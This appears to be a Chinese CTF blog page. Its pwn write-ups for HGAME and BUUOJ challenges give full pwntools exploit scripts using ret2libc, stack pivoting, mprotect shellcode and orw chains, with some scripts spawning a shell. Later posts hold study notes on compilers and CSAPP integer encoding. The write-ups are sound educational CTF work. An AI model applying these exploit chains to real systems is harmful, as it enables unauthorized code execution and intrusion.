第二种做法就是用one_gadget查找libc中，执行binsh的指令 这里其实条件比较苛刻，要求一些寄存器中的地址对应的内容为null，这里存在偶然性，不过也是可以的 所以我们采用第一种方法 123io.sendlineafter(b&#x27;one.&#x27;,str(-9))payload = b&#x27;/bin/sh\\x00&#x27; + p64(sys_addr)io.sendafter(b&#x27;your name&#x27;,payload) 这里我们可以先打开tmux终端，在tmux运行exp，前提是exp设置了context.terminal &#x3D; [“tmux”,”splitw”,”-h”]，然后进行gdb.attch 这里方便起见我们可以设置一个调试函数，方便exp运行时临时调试程序 123def b(): gdb.attach(io) pause() 将这个函数放置到我们想调试的地方 效果： 然后再gdb先后输入got一一&gt;p&#x2F;x *(地址),就可以查看某个got中的内容了 这里吐槽一下，其实gdb新版本可以直接看到got表的内容，我这个gdb已经是ubuntu20.02的最高版本了，我这个docker就不折腾了 （PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。解法：内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。因此我们可以通过覆盖地址的后几位来可以控制程序的流程） 结果： ORWCTF中这类PWN题目通常通过禁用execve系统调用添加沙箱，不能直接执行命令getshell，这时候需要通过调用open、read、write这样的函数打开flag，存到内存中，再输出 将三个函数开头字母作为简称，也就是orw 可以通过seccomp-tools来判断是否添加沙箱，以及查看沙箱的规则 1seccomp-tools dump ./pwn 像这样就是比较经典的只允许64位的read、write、open三个系统调用，其他的系统调用号都被禁止 这里需要用到栈迁移 栈迁移的本质就是控制rsp和rbp，将栈帧转移到我们想要的位置，这里需要执行两次leave;return。 leave&#x3D;mov rsp,rbp;pop rbp 所以第一次不能将rsp进行改变 第一次是将rbp转移，第二次是将rsp转移。 栈迁移条件： 存在 leave ret 这类gadget指令 存在可执行shellcode的内存区域 链接：栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com) 这里说明一下：open拿到的只是文件句柄，里面没有文件内容，要读文件内容还是要执行read，read的参数就要求文件句柄，read的功能就是将硬盘文件内容读到内存中的某一块缓冲区中，然后write负责将缓冲区中的内容写进屏幕中 题目中溢出长度为0x30,那注入地址为0x30&#x2F;0x8&#x3D;6,就6条显然不能构成rop链 进行栈迁移，由于我没做过栈迁移的题，这里详细写一下 第一次溢出，把rbp放到别的地方,然后泄漏puts的内存地址,rbp放到bss+0x200，这个地址其实是程序地址之外的空间了，所以拿来当作新栈对程序不产生影响 12payload1 = b&#x27;A&#x27; * 0x100 + p64(bss+0x200)payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr) 计算基地址，算出orw三个函数的地址 12345success(&#x27;puts:&#x27;,hex(puts_addr))base_addr = puts_addr - libc_putsopen_addr = libc.sym[&#x27;open&#x27;] + base_addrread_addr = libc.sym[&#x27;read&#x27;] + base_addrwrite_addr = libc.sym[&#x27;write&#x27;] + base_addr 第二次溢出，将rbp放置到新栈 1234payload = b&quot;a&quot; * 0x100payload += p64(bss + 0x200)payload += p64(vuln_addr + 0x0F)io.send(payload) 执行完第二次溢出后，rsp在旧栈位置，rbp在新栈位置，为了让rbp在新栈位置不发生移动，这里我们直接将之后的函数直接定位到read函数上，+0xf，因为read函数之前有对rbp和rsp进行操作 第三次溢出，将进行两次leave；ret，这样rsp就将锁定在新栈的栈顶位置，因为ret主要是靠rsp来控制程序流，rbp只是拿来定位局部变量 1234567891011121314151617181920212223242526payload2 = b&#x27;/flag\\x00\\x00\\x00&#x27;payload2 += p64(pop_rdi_ret)payload2 += p64(0x404160) #这里就是新rbp-0x100的地方，也就是刚写&#x27;/flag\\x00\\x00\\x00&#x27;的地址payload2 += p64(pop_rsi_ret)payload2 += p64(0)payload2 += p64(open_addr)payload2 += p64(pop_rdi_ret)payload2 += p64(0x3) payload2 += p64(pop_rsi_ret)payload2 += p64(0x404711) # 可能是指定缓冲区地址payload2 += p64(pop_rdx_ret)payload2 += p64(0x100)payload2 += p64(read_addr)payload2 += p64(pop_rdi_ret)payload2 += p64(0x1)payload2 += p64(pop_rsi_ret)payload2 += p64(0x404711)payload2 += p64(pop_rdx_ret)payload2 += p64(0x100)payload2 += p64(write_addr)payload2 = payload2.ljust(0x100,b&#x27;a&#x27;)payload2 += p64(0x404160) # 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去payload2 += p64(leave_ret_addr) 所以第三次的rbp最终位置不用去管它，rbp的任务就是让rsp锁定到新栈栈顶位置就行 这里read和write都需要三个参数，64位，函数从左到右寄存器分别是rdi,rsi,rdx 通过pop ret指令来控制rsp从而控制程序流 以上就是栈迁移的详细内容 完整代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from pwn import *# io = process(&#x27;./vuln&#x27;)io = remote(&#x27;week-1.hgame.lwsec.cn&#x27;,31266)elf = ELF(&#x27;./vuln&#x27;)libc = ELF(&#x27;libc-2.31.so&#x27;)context.log_level = &quot;debug&quot;context.terminal = [&quot;konsole&quot;, &quot;-e&quot;]vuln_addr = elf.sym[&#x27;vuln&#x27;]libc_puts = libc.sym[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]leave_ret_addr = 0x4012bepop_rdi_ret = 0x0401393bss = 0x404060# 第一次溢出，把rbp放到别的地方,然后泄漏puts的内存地址payload1 = b&#x27;A&#x27; * 0x100 + p64(bss+0x200)payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)io.sendafter(&#x27;task.\\n&#x27;,payload1)puts_addr = u64(io.recvline().split(b&#x27;\\n&#x27;)[0].ljust(8,b&#x27;\\0&#x27;))success(&#x27;puts:&#x27;,hex(puts_addr))base_addr = puts_addr - libc_putsopen_addr = libc.sym[&#x27;open&#x27;] + base_addrread_addr = libc.sym[&#x27;read&#x27;] + base_addrwrite_addr = libc.sym[&#x27;write&#x27;] + base_addrpop_rsi_ret = 0x02601f + base_addrpop_rdx_ret = 0x142c92 + base_addrpayload = b&quot;a&quot; * 0x100payload += p64(bss + 0x200)payload += p64(vuln_addr + 0x0F)io.send(payload)# 第二次溢出，将rbp放到二次写入的开始处，将rsp放到与rbp相同位置payload2 = b&#x27;/flag\\x00\\x00\\x00&#x27;payload2 += p64(pop_rdi_ret)payload2 += p64(0x404160) #这里就是新rbp-0x100的地方，也就是刚写&#x27;/flag\\x00\\x00\\x00&#x27;的地址payload2 += p64(pop_rsi_ret)payload2 += p64(0)payload2 += p64(open_addr)payload2 += p64(pop_rdi_ret)payload2 += p64(0x3) payload2 += p64(pop_rsi_ret)payload2 += p64(0x404711) # 指定缓冲区地址,随意payload2 += p64(pop_rdx_ret)payload2 += p64(0x100)payload2 += p64(read_addr)payload2 += p64(pop_rdi_ret)payload2 += p64(0x1)payload2 += p64(pop_rsi_ret)payload2 += p64(0x404711)payload2 += p64(pop_rdx_ret)payload2 += p64(0x100)payload2 += p64(write_addr)payload2 = payload2.ljust(0x100,b&#x27;a&#x27;)payload2 += p64(0x404160) # 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去payload2 += p64(leave_ret_addr)# gdb.attach(io)io.send(payload2)io.interactive() 最后结果： 这里还有一种做法，原本程序开启了NX保护，我们可以通过libc中的mprotect函数给一段内存区域更改权限，然后在栈中写入shellcode，然后让程序执行栈中的shellcode，这里shellcode也很长，也需要用到栈迁移 12345678910111213141516payload2 = p64(0) #0x404160payload2 += p64(pop_rdi_ret)payload2 += p64(0x404000) #这里是mprotect函数要操作的开始地址 #0x404170payload2 += p64(pop_rsi_ret)payload2 += p64(0x1000) # 要操作的大小 #0x404180payload2 += p64(pop_rdx_ret)payload2 += p64(7) # 7代表可读可写可执行权限 #0x404190payload2 += p64(mprotect_addr)payload2 += p64(0x4041a8) #0x4041a0payload2 += asm(shellcraft.open(&quot;/flag&quot;,1)) payload2 += asm(shellcraft.read(3,0x404500,100))payload2 += asm(shellcraft.write(1,0x404500,100))payload2 = payload2.ljust(0x100,b&#x27;a&#x27;)payload2 += p64(0x404160) # 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去payload2 += p64(leave_ret_addr) mprotect参数有三，起始地址，长度，权限 这里程序出了bug，flag中g实在写不进去不知道为啥(更新，没设置64位，加上context.arch &#x3D; “amd64”这句就行，因为系统默认32位，&#x2F;flag的字符串正好超出4字节数据) 完整代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *# io = process(&#x27;./vuln&#x27;)io = remote(&#x27;week-1.hgame.lwsec.cn&#x27;,31266)elf = ELF(&#x27;./vuln&#x27;)libc = ELF(&#x27;libc-2.31.so&#x27;)# context.log_level = &quot;debug&quot;# context.terminal = [&quot;konsole&quot;, &quot;-e&quot;]context.arch = &quot;amd64&quot;vuln_addr = elf.sym[&#x27;vuln&#x27;]libc_puts = libc.sym[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]leave_ret_addr = 0x4012bepop_rdi_ret = 0x0401393bss = 0x404060# 第一次溢出，把rbp放到别的地方,然后泄漏puts的内存地址payload1 = b&#x27;A&#x27; * 0x100 + p64(bss+0x200)payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)io.sendafter(&#x27;task.\\n&#x27;,payload1)puts_addr = u64(io.recv(6).ljust(8,b&#x27;\\0&#x27;))success(&#x27;puts:&#x27;,hex(puts_addr))base_addr = puts_addr - libc_putsmprotect_addr = libc.sym[&#x27;mprotect&#x27;] + base_addrpop_rsi_ret = 0x02601f + base_addrpop_rdx_ret = 0x142c92 + base_addrpayload = b&quot;a&quot; * 0x100payload += p64(bss + 0x200)payload += p64(vuln_addr + 0x0F)io.send(payload)# 第二次溢出，将rbp放到二次写入的开始处，将rsp放到与rbp相同位置payload2 = p64(0) #0x404160payload2 += p64(pop_rdi_ret)payload2 += p64(0x404000) #这里是mprotect函数要操作的开始地址 #0x404170payload2 += p64(pop_rsi_ret)payload2 += p64(0x1000) # 要操作的大小 #0x404180payload2 += p64(pop_rdx_ret)payload2 += p64(7) # 7代表可读可写可执行权限 #0x404190payload2 += p64(mprotect_addr)payload2 += p64(0x4041a8) #0x4041a0payload2 += asm(shellcraft.open(&quot;/flag&quot;,1)) payload2 += asm(shellcraft.read(3,0x404500,100))payload2 += asm(shellcraft.write(1,0x404500,100))payload2 = payload2.ljust(0x100,b&#x27;a&#x27;)payload2 += p64(0x404160) # 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去payload2 += p64(leave_ret_addr)# gdb.attach(io)io.send(payload2)io.interactive() simple_shellcode题目： 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; init(argc, argv, envp); mmap((void *)0xCAFE0000LL, 0x1000uLL, 7, 33, -1, 0LL); puts(&quot;Please input your shellcode:&quot;); read(0, (void *)0xCAFE0000LL, 0x10uLL); sandbox(); MEMORY[0xCAFE0000](); return 0;&#125; 题目用mmap映射出一段以0xCAFE0000开始，长度为0x1000，权限是7（可读可写可执行） 用sandbox设置了系统权限 这里向0xCAFE0000读入16字节，可以考虑rop，但检查保护时，就放弃了 写入shellcode,用orw的话，长度也远远不够 HINTS: 一次read不够多，为什么不再读一次呢？ 第一次将read的shellcode读入，然后再程序执行0xCAFE0000这段内存，从而执行读入的read，那就要好好设计一波read的shellcode了，起初我是用rdi这种64位的寄存器写的，但是最终长度远远超过16字节 1234567shellcode = asm(&quot;&quot;&quot;mov rax,0mov rsi,0xCAFE0010mov rdi,0mov rdx,0x1000syscall&quot;&quot;&quot;) 然后只能全部改成edi这种32位寄存器的形式了 1234567shellcode = asm(&quot;&quot;&quot;mov eax,0mov esi,0xCAFE0010mov edi,0mov edx,0x1000syscall&quot;&quot;&quot;) 但是还是不行 把mov 0的操作全部换成xor，就对了 1234567shellcode = asm(&quot;&quot;&quot;xor eax,eaxmov esi,0xCAFE0010xor edi,edimov edx,0x1000syscall&quot;&quot;&quot;) 这里要调用read，就要涉及系统调用号： 在汇编程序中使用Linux系统调用。 您需要采取以下步骤在程序中使用Linux系统调用 将系统调用号放在EAX寄存器中。 结果通常在EAX寄存器中返回 &#x3D;&#x3D;这里注意64位和32的系统调用号是不一样的&#x3D;&#x3D; 32位： 传参方式：首先将系统调用号 传入 eax，sysread 的调用号 为 3 syswrite 的调用号 为 4 64位： 传参方式：首先将系统调用号 传入 rax，sysread 的调用号 为 0 syswrite 的调用号 为 1 所以这里的read系统调用号是0 这里写入read的shellcode后，执行我们写的shellcode，第二次写入的orw也是shellcode，这里要设置amd64位不然就无了。 这里有个细节在执行syscall指令时，程序会按照普通程序一样，会将shellcode的下一条指令压栈，所以在执行完syscall后，下一个指令要执行的地方就是syscall后的地址，这里除syscall这一条指令，长度为14，所以第二次写入的地址，只能是0xCAFE0000+14之后的地址，这里我们选择为0xCAFE0010就够了，然后直接写入orw的shellcode。 123payload = asm(shellcraft.open(&#x27;/flag&#x27;))payload += asm(shellcraft.read(3,0xcafe0500,0x100))payload += asm(shellcraft.write(1,0xcafe0500,0x100)) 这里的缓冲区我原先是写0xcafe1000的，结果后面才发现它总共才申请了0x1000的大小内存，哈哈 完整代码: 1234567891011121314151617181920212223from pwn import *io = remote(&#x27;week-1.hgame.lwsec.cn&#x27;,30105)# context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;shellcode = asm(&quot;&quot;&quot;xor eax,eaxmov esi,0xCAFE0010xor edi,edimov edx,0x1000syscall&quot;&quot;&quot;)print(&#x27;len:&#x27;,len(shellcode))io.sendafter(&#x27;shellcode:\\n&#x27;,shellcode)# payload = b&#x27;\\x90&#x27; * 0x10payload = asm(shellcraft.open(&#x27;/flag&#x27;))payload += asm(shellcraft.read(3,0xcafe0500,0x100))payload += asm(shellcraft.write(1,0xcafe0500,0x100))io.send(payload)io.interactive() 结果： Week2","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"pwn_practice1","slug":"pwn-practice1","date":"2023-01-13T03:50:36.000Z","updated":"2023-01-13T12:33:23.186Z","comments":true,"path":"2023/01/13/pwn-practice1/","link":"","permalink":"https://pa1r0t.github.io/2023/01/13/pwn-practice1/","excerpt":"pwn","text":"pwn hgame2018_flag_server开启docker1docker run -v &quot;$(pwd):/ctf/work&quot; -i -t skysider/pwndocker /bin/bash 程序核心逻辑这里有个随机值，输入的值和随机值比较 我准备用逆向的守法，来搞它，写了个cpp，结果运行多次结果都不一样 123456789101112#include&lt;time.h&gt;#include&lt;stdio.h&gt;#include&lt;random&gt;int main(void)&#123; unsigned int v3 = time(0); printf(&quot;%d\\n&quot;,v3); srand(v3); int v8 = rand(); printf(&quot;%u&quot;,v8); return 1;&#125; giao~~~~~ 然后我只能老老实实找漏洞了 先是发现可以读取字符串name 找到读取字符串的函数是自己编的 最后v10进行检验 这里看栈分布 直接在s1的下面，直接填充’A’*((0x50-0x10)+size(int)) exp123456789from pwn import *io = remote(&#x27;node4.buuoj.cn&#x27;,28388)# io = process(&#x27;./flag_server&#x27;)io.sendlineafter(&#x27;your username length: &#x27;,b&#x27;-1&#x27;)io.sendline(b&#x27;A&#x27;*0x44)io.interactive()io.close() 结果 ciscn_2019_c_1核心程序 利用点：利用gets，去覆盖栈中的内容，利用rop链泄漏puts函数在内存中的地址，然后通过这个地址去找对应版本的libc，找到内存中system的地址和bin_sh字符串的地址，再利用一次rop链执行system函数即可 这里有一个模块叫LibcSearcher，它可以让使用者不用担心本地和远程的libc是否统一，它可以帮你去寻找正在执行的libc。非常好用 寻找rop目的：寻找pop rdi ret;指令，因为该文件是64位，而64位文件采用寄存器存放参数，第一个参数存放的寄存器就是rdi 命令： 1ROPgadget --binary ./ciscn_2019_c_1 --only &#x27;pop|ret&#x27; 结果： 脚本：123456789101112131415161718192021222324252627282930313233343536from pwn import *from LibcSearcher import *# io = process(&#x27;./ciscn_2019_c_1&#x27;)io = remote(&quot;node4.buuoj.cn&quot;,26320)elf = ELF(&#x27;ciscn_2019_c_1&#x27;)#encrypt_addr = elf.sym[&#x27;encrypt&#x27;]puts_got = elf.got[&#x27;puts&#x27;] # 用于打印puts的地址puts_plt = elf.plt[&#x27;puts&#x27;] # puts函数地址rdi_ret = 0x400c83 # puts函数的参数 puts函数的地址 puts函数执行完的返回地址，用于下一次的shellcodepayload1 = b&#x27;A&#x27; * 0x50 + p64(0) + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)io.sendlineafter(b&#x27;Input your choice!&#x27;,b&#x27;1&#x27;)io.sendlineafter(b&#x27;Input your Plaintext to be encrypted&#x27;,payload1)io.recvuntil(b&#x27;Ciphertext\\n&#x27;)io.recvuntil(b&#x27;\\n&#x27;)# 拿到puts在内存中的地址puts_addr = u64(io.recvline().strip().ljust(8,b&#x27;\\0&#x27;))print(&#x27;addr:&#x27;,hex(puts_addr))# 找内存libc的地址libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)addr_base = puts_addr - libc.dump(&quot;puts&quot;)print(&#x27;libc&#x27;,addr_base)sys_addr = libc.dump(&#x27;system&#x27;) + addr_basebinsh_addr = libc.dump(&#x27;str_bin_sh&#x27;) + addr_basepayload2 = b&#x27;A&#x27; * 0x50 + p64(0) + p64(rdi_ret) + p64(binsh_addr) + p64(sys_addr) + p64(encrypt_addr)io.sendlineafter(b&#x27;Input your Plaintext to be encrypted&#x27;,payload2)io.interactive() 结果：","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"编译2","slug":"编译偏2","date":"2023-01-12T14:07:41.000Z","updated":"2023-01-14T12:49:16.099Z","comments":true,"path":"2023/01/12/编译偏2/","link":"","permalink":"https://pa1r0t.github.io/2023/01/12/%E7%BC%96%E8%AF%91%E5%81%8F2/","excerpt":"高级语言描述","text":"高级语言描述 编译基础知识 高级语言：程序语言是一个记号系统 语法 语法使得这串字符形成一个形式上正确的程序。 语法＝词法规则＋语法规则 例如： 0.5*x1+c * 0.5、x1、c、+是语言的单词符号 0.5*x1+c是语言的语法单位 语法单位：表达式、子句、语句、函数、过程、程序 语言的词法规则和语法规则定义了程序的形 式结构，是判断输入字符串是否构成一个形 式上正确的程序的依据。 语义 字母表和符号表一些概念： 字母表：是符号的非空有穷集合，是符号的非空有穷集合 符号串：顾名思义。空串：不含有任何符号的串称作空串，记作ε 句子：字母表上符合某种规则构成的串。串就是句子 （注：约定用a,b,c…表示符号；用α,β,γ…表示符号串； 用A,B,C…表示其集合） 符号串集合的运算： 符号串集合的运算： 例如：A&#x3D;{a,b}; B&#x3D;{c,e,d} 则AB&#x3D;{ac,ae,ad,bc,be,bd} A中的元素必须在B元素的前面，否则是错的，这个顺序要搞对 例如：串集A＝{a}的各次方幂定义为： – A0&#x3D;{ε} – A1&#x3D;A&#x3D;{a} – …… – An&#x3D;AAn-1(n&gt;0)&#x3D;{a…a} 字母表的闭包与正闭包 字母表A的闭包（A）：A&#x3D;A0∪A1∪A2∪… 即：由A上符号组成的所有串的集合（包括空串 ε ） 字母表A的正闭包（A+）：A+&#x3D; A1 ∪A2∪ …&#x3D;A*-{ε} 即：由A上符号组成的所有串的集合（不包括空 串ε ） 字母表上语言：是字母表上正闭包的子集 文法与语言的关系文法： 其语法规则如下： – &lt;句子&gt;→&lt;主语&gt;&lt;谓语&gt; – &lt;主语&gt; →&lt;形容词&gt;&lt;名词&gt; – &lt;谓语&gt; →&lt;动词&gt;&lt;宾语&gt; – &lt;宾语&gt; → &lt;形容词&gt;&lt;名词&gt; – &lt;形容词&gt; →Young | pop – &lt;名词&gt; →men | music – &lt;动词&gt; →like 相关概念： 非终结符 出现在规则的左部、用&lt;&gt;括起来、表示一定 语法概念的词 非终结符集合用VN表示。 终结符 语言中不可再分割的字符串(包括单个字符 组成的串)。注：终结符是组成句子的基本单位 终结符集合用VT表示。 开始符号","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"csapp1","slug":"csapp1","date":"2023-01-09T06:30:39.000Z","updated":"2023-01-17T07:43:40.272Z","comments":true,"path":"2023/01/09/csapp1/","link":"","permalink":"https://pa1r0t.github.io/2023/01/09/csapp1/","excerpt":"学习一下csapp,第一篇","text":"学习一下csapp,第一篇 在32位系统：-2147483648 &lt; 2147483647 结果为false ​ int i &#x3D; -2147483648; i &lt; 2147483647 结果为true ​ -2147483648-1 &lt; 2147483647 结果为true 在计算机中运算是会发生溢出，假如运算后的数超过了32位，那最终结果可能是一个负数，或者是其他正整数 我们用linux中的gdb软件来证明其中的结论 很显然，上述超乎我们的预想 然而在整数运算时是符合交换律的，但是在计算机中浮点数却不符合交换律 这里做一个实验：用(1e20 + -1e20) + 3.14 结果为：3.1400000000000001 再用1e20 + (-1e20 + 3.14)，这里3.14对于-1e20微不足道 结果为：0 他们用有限的位组合形式表示在数域中无线扩张的数 定点数和浮点数计算机中只能通过约定小数点的位置来表示 小数点位置约定在固定位置的数称为定点数 小数点位置约定为可浮动的数称为浮点数 定点小数用来表示浮点数的尾数部分 任何实数：X&#x3D;(-1)^s^ ×M×R^E^ 其中，S取值为0或1，用来决定数X的符号；M是一个二进制定点小数 ，称为数X的尾数（mantissa）；E是一个二进制定点整数，称为数X 的阶或指数（exponent）；R是基数（radix、base），可以为2、4和16等,计算机中只要表示S、M和E三个信息，就能确定X的值，叫浮点数 定点数的编码表示浮点数（可用一个定点小数和一个定点整数来表示） 定点数的编码（解决正负号问题）: 原码、补码、移码、反码 （很少用） 原码表示： 其中由上图得0有两种表示，不唯一 加减方式，对于同号，取绝对值相加，然后在加上符号，对于异号，是比较哪个绝对值大，然后大的间小的，然后再加上绝对值大的符号。这样加减方式繁琐不统一 &#x3D;&#x3D;从 50年代开始，整数都采用补码来表示 但浮点数的尾数用原码定点小数表示&#x3D;&#x3D; 补码 - 模运算（modular运算）在一个模运算系统中，一个数与它除以“模”后的余数等价 一个负数的补码等于模减该负数的绝对值 对于某一确定的模，某数减去小于模的另一数，总可 以用该数加上另一数负数的补码来代替 补码（modular运算）：+ 和– 的统一 例1：“钟表”模运算系统 假定时针只能顺拨，从10点倒拨4格后是几点？ 10- 4 &#x3D; 10+(12- 4) &#x3D; 10+8 &#x3D; 6（mod 12） 结论：一个负数的补码等于将对应正数补码 各位取反、末位加一补码的定义 假定补码有n位，则：[X]补&#x3D; 2n + X （-2n-1≤X＜2n-1 ，mod 2n） X是真值，[x]补是机器数 求特殊数的补码假定机器数有n位： ① [-2^n-1^]补&#x3D; 2^n^ - 2^n-1^ &#x3D; 10…0（n-1个0） （mod 2^n^） ② [-1]补&#x3D; 2^n^ - 0…01 &#x3D; 11…1（n个1） （mod 2^n^) ③ [+0]补&#x3D; [-0]补&#x3D; 00…0（n个0） 变形补码的表示变形（4’s）补码：双符号，用于存放可能溢出的中间结果 求真值的补码: 简便方法：从右向左遇到第一个1的前面各位取反 求补码的真值: 简便求法： 符号为0，则为正数，数值部分相同 符号为1，则为负数，数值各位取反，末位加1 移码表示Excess 什么是移码表示？ 将每一个数值加上一个偏置常数（ Excess &#x2F; bias） 通常，当编码位数为n时，bias取 2^n-1^ 或 2^n-1^-1（如 IEEE 754) 为什么要用移码来表示指数（阶码）? 便于浮点数加减运算时的对阶操作（比较大小） 带符号整数有三种定点编码方式： Signed and magnitude （原码）：定点小数，用来表示浮点数的尾数 Excess (biased) notion （移码）：定点整数，用于表示浮点数的阶（指数） Two’s complement （补码）：50年代以来，所有计算机都用补码来表示带符号整数 为什么用补码表示带符号整数？ 补码运算系统是模运算系统，加、减运算统一 数0的表示唯一，方便使用 比原码多表示一个最小负数 无符号数:常在一个数的后面加一个“u”或“U”表示无符号数 &#x3D;&#x3D;若同时有无符号和带符号整数，则C编译器将带符号整数强制转换为无符号数&#x3D;&#x3D; 带*的与预想的不同 编译器处理常量时默认的类型 C表达式-2147483648 &lt; 2147483647的执行结 果为false，这是因为编译器在编译时，是把符号和字面量分开识别，先识别字面量2147483648，2147483648在C90中时2^31^,属于unsigned int，所以此次比较是根据无符号数来进行比较。 若定义变量“int i&#x3D;-2147483648;”，则“i &lt; 2147483647”的执行 结果为true，这个不用解释，int类型已经定义好类型了，不需要再判别 如果将表达式写成“-2147483647-1 &lt; 2147483647”，则结果会怎 样呢？是true 不过C99的标准不一样，看上面的表就知道","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"编译篇1","slug":"编译篇1","date":"2023-01-09T02:16:11.000Z","updated":"2023-01-14T11:28:58.372Z","comments":true,"path":"2023/01/09/编译篇1/","link":"","permalink":"https://pa1r0t.github.io/2023/01/09/%E7%BC%96%E8%AF%91%E7%AF%871/","excerpt":"引论学习","text":"引论学习 程序设计语言的转换 编译：从高级语言到低级语言的过程 解释：接受高级语言的一条语句输入，进行解释并控制计算机执行，马上获得该语句的执行结果，然后接受下一条语句 优点：实现人机交互 缺点：效率差，每次都要解释，而不像编译一样，只需编译一次，以后只需执行即可 编译的转换过程： 两阶段转换：编译一一执行 三个阶段的转换：编译一一汇编一一运行 编译程序概述自然语言的翻译： 识别句子中一个个单词 分析句子的语法结构 根据句子的含义进行初步翻译 对译文进行修饰 写出最后译文 编译程序的工作： 词法分析 语法分析 语义分析和中间代码的生成 优化 目标代码的生成 词法分析： 任务：对源程序的字符串进行扫描和分解，识别出一个个单词 基本字：void,int,float 标识符：a,b,c,d 长整数：50 运算符：+，-，*，&#x3D; 界限符：{}，；（） 词法分析依照词法规则，识别出正确的单词，转换成统一规格，备用 转换： 对基本字、运算符、界限符的转换 标识符的转换 常数的转换 转换完成的格式（类号、内码） 描述词法规则的有效工具是正规式和有限自动机 语法分析： 任务：词法分析后的单词，根据语言的语法规则，把单词符号组成各类语法单位：子句、语句 语法规则：规定单词如何组成句，称为文法 语法规则的表示： BNF: A::&#x3D;B|C 表示A定义为B或C 语法分析的方法：推导和规约 推导：最左推导和最右推导 规约：最右规约和最左规约 赋值语句的语法规则： A::&#x3D;V&#x3D;E E::&#x3D;T|E+T T::&#x3D;F|T*F F::&#x3D;V|(E)|C V::&#x3D;标识符 C::&#x3D;常数 例题：​ x &#x3D; a + b*50 根据上面的文法规则运用最右推导：最右推导就是每次只变换最右的字母 A&#x3D;&gt;V&#x3D;E &#x3D;&gt; V&#x3D;E+T &#x3D;&gt; V&#x3D;E+T*F &#x3D;&gt; T&#x3D;E+T*C &#x3D;&gt; T&#x3D;E+T*50 &#x3D;&gt; T&#x3D;E+F*50 &#x3D;&gt; T&#x3D;E+V*50 &#x3D;&gt; T&#x3D;E+b*50 &#x3D;&gt; T&#x3D;T+b*50 &#x3D;&gt; T&#x3D;V+b*50 &#x3D;&gt; T&#x3D;a+b*50 如何最左规约，就是从T&#x3D;a+b*50变换到A,也就是赋值运算成立，每次只变换最左边的字母，是最右推导的逆运算 计算机是用语法树来检验语法： 中间代码生成 任务：根据语法分析其中的含义，进行初步翻译，产生介于源代码和目标代码之间的一种代码 分为两阶段的工作： 对每种语法范畴进行静态语义检查 如果语义正确，就进行中间代码的翻译 中间代码形式：四元式、三元式、逆波兰式 将x&#x3D;a+b*50变成中间代码： 序号 算符 左操作数 右操作数 结果 （1） 将整常数50转换为实常数 T1 （2） * b T1 T2 （3） + a T2 T3 （4） &#x3D; T3 x 以上就是四元式 优化 对中间代码进行加工变换，变换出效率更高的代码 原则：等价变换，在不改变原意的情况下 主要方面： 公共子表达式的提取：x&#x3D;(a+b)*c+(a+b)*d 合并已知量：c&#x3D;a+b d &#x3D; a+b 未改变a，b的值 删除无用语句：一些注释或者一些与程序本身无关的表达式 循环优化 例如将以下语句转成中间代码： 1234for( k = 1; k &lt;= 100; k++)&#123; m = i + 10*k; n = j + 10*k;&#125; 优化：每次乘实际上都是在上一次的基础是+10,所以能将乘操作优化成加法操作，来达到提升效率的目的 目标代码生成 任务：把优化的中间代码转化成特定机器上的低级语言 目标指令的形式： 绝对指令代码：就是01010的机器代码如exe文件，可立即执行 汇编指令代码：汇编语言程序，需要通过汇编程序汇编后才能运行 可重定位指令代码：先将各目标模块连接起来，确定变量、常数在主存中的位置，装入主存后才能成为可以运行的绝对指令代码 表格与表格管理 表格作用：用来记录源程序的各种信息以及编译过程中的各种状况 与编译前三阶段有关的表格： 符号表：用来登记 源程序中的常量名、 变量名、数组名、 过程名等，记录它 们的性质、定义和引用情况 常数表与标号表：登记各类常数值，登记标号的定义与作用 入口名表：登记过程的层号，分程序符号表入口 中间代码表 出错与处理错误类型: 语法错误:在词法分析和语法分析阶段检测出来 语义错误：一般在语义分析阶段检测 遍：指对源程序或源程序的中间结果从头到尾扫 描一次，并做有关的加工处理，生成新的中间结 果或目标代码的过程。 （遍与阶段的含义毫无关系。） 一遍扫描 &#x3D;&#x3D;一遍扫描不是一次性扫描和分析，而是通过一句一句的表格是进行反复扫描和分析&#x3D;&#x3D; 编译程序生成生成方式： 直接用机器语言编写编译程序 用汇编语言编写编译程序 注：编译程序核心部分常用汇编语言编写 用高级语言编写编译程序：这是普遍采用的方法 .自编译：内置核心编译程序，如何用自身的核心程序去编译其他程序 编译工具：LEX(词法分析)与YACC(用于自动产生LALR分析 表) 移植（同种语言的编译程序在不同类型的机器之 间移植） 写编译程序的基本条件： 源程序语言 目标程序语言 